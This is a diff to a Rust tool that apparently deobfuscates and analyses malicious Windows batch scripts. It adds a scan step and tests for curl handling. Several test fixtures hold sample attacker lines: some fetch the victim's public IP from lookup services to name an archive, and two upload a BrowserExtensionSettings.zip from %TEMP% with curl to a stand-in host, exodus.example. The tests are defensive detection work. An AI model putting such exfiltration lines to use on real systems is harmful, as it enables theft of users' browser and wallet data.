@@ -6348,6 +6348,7 @@ fn analyze_inner(
         js_scan::scan_js_payloads(&mut env);
         ps1_scan::scan_inline_powershell_text(&out, &mut env);
         deob_scan::scan_deob_text(&out, &mut env);
+        deob_scan::scan_raw_curl_known_percent_urls(&raw_text, &mut env);
         // The char-index-extractor scan needs the FULL source — our
         // normalize pipeline's marker-noise stripping can mangle the
         // PS body that hosts the `function Musculos…` definition
@@ -13374,6 +13375,14 @@ echo %MARK%
             let lines = run_pipeline(&format!("curl -s {endpoint}"), &mut env);
             assert_eq!(lines, vec!["203.0.113.10".to_string()], "{endpoint}");
         }
+    }
+
+    #[test]
+    fn synth_curl_ifconfig_me_ip_returns_stable_public_ip() {
+        let mut env = Environment::new(&Config::default());
+        let lines = run_pipeline("curl -s https://ifconfig.me/ip", &mut env);
+
+        assert_eq!(lines, vec!["203.0.113.10".to_string()]);
     }
 
     #[test]
@@ -30709,6 +30718,147 @@ mshta C:/Out/payload.hta"#,
             )
         });
         assert!(!bad, "curl URL kept command suffix: {:?}", env.traits);
+    }
+
+    #[test]
+    fn for_f_curl_icanhazip_feeds_later_variable() {
+        let script = br#"setlocal EnableDelayedExpansion
+for /F "tokens=* delims=" %%I in ('curl -s https://icanhazip.com') do set "publicIP=%%I"
+echo archive=W_%USERNAME%_!publicIP!.zip
+"#;
+        let report = analyze(script, &Config::default());
+        assert!(
+            report
+                .deobfuscated
+                .contains("echo archive=W_puncher_203.0.113.10.zip"),
+            "got:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            !report.traits.iter().any(|t| matches!(
+                t,
+                Trait::ForUnresolvedSource { pipeline } if pipeline.contains("icanhazip.com")
+            )),
+            "icanhazip curl endpoint should synthesize a stable response: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn for_f_curl_ifconfig_me_ip_feeds_later_variable() {
+        let script = br#"setlocal EnableDelayedExpansion
+for /F "tokens=* delims=" %%I in ('curl -s https://ifconfig.me/ip') do set "publicIP=%%I"
+echo archive=W_%USERNAME%_!publicIP!.zip
+"#;
+        let report = analyze(script, &Config::default());
+        assert!(
+            report
+                .deobfuscated
+                .contains("echo archive=W_puncher_203.0.113.10.zip"),
+            "got:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            !report.traits.iter().any(|t| matches!(
+                t,
+                Trait::ForUnresolvedSource { pipeline } if pipeline.contains("ifconfig.me")
+            )),
+            "ifconfig.me curl endpoint should synthesize a stable response: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn for_f_curl_ipv4_icanhazip_feeds_later_variable() {
+        let script = br#"setlocal EnableDelayedExpansion
+for /F "tokens=* delims=" %%I in ('curl -s https://ipv4.icanhazip.com') do set "publicIP=%%I"
+echo archive=W_%USERNAME%_!publicIP!.zip
+"#;
+        let report = analyze(script, &Config::default());
+        assert!(
+            report
+                .deobfuscated
+                .contains("echo archive=W_puncher_203.0.113.10.zip"),
+            "got:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            !report.traits.iter().any(|t| matches!(
+                t,
+                Trait::ForUnresolvedSource { pipeline } if pipeline.contains("ipv4.icanhazip.com")
+            )),
+            "ipv4.icanhazip curl endpoint should synthesize a stable response: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn for_f_curl_ipinfo_ip_feeds_later_variable() {
+        let script = br#"setlocal EnableDelayedExpansion
+for /F "tokens=* delims=" %%I in ('curl -s https://ipinfo.io/ip') do set "publicIP=%%I"
+echo archive=W_%USERNAME%_!publicIP!.zip
+"#;
+        let report = analyze(script, &Config::default());
+        assert!(
+            report
+                .deobfuscated
+                .contains("echo archive=W_puncher_203.0.113.10.zip"),
+            "got:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            !report.traits.iter().any(|t| matches!(
+                t,
+                Trait::ForUnresolvedSource { pipeline } if pipeline.contains("ipinfo.io")
+            )),
+            "ipinfo curl endpoint should synthesize a stable response: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn for_f_curl_percent_url_variable_emits_structured_download() {
+        let report = analyze(
+            br#"set "uploadUrl=https://exodus.example/files/upload.php"
+for /f "delims=" %%a in ('curl -F "file=@%TEMP%\BrowserExtensionSettings.zip" "%uploadUrl%"') do set "response=%%a"
+"#,
+            &Config::default(),
+        );
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://exodus.example/files/upload.php" && dst.is_none()
+            )),
+            "FOR /F curl concrete percent URL variable was not surfaced: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn skipped_for_f_curl_with_known_percent_url_still_surfaces_download() {
+        let report = analyze(
+            br#"set "uploadUrl=https://exodus.example/files/upload.php"
+set "zipFile=%TEMP%\BrowserExtensionSettings.zip"
+goto end
+for /f "delims=" %%a in ('curl -F "file=@%zipFile%" "%uploadUrl%"') do set "response=%%a"
+:end
+"#,
+            &Config::default(),
+        );
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://exodus.example/files/upload.php" && dst.is_none()
+            )),
+            "known URL variable in skipped FOR/F curl was not rescued: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
     }
 
     #[test]
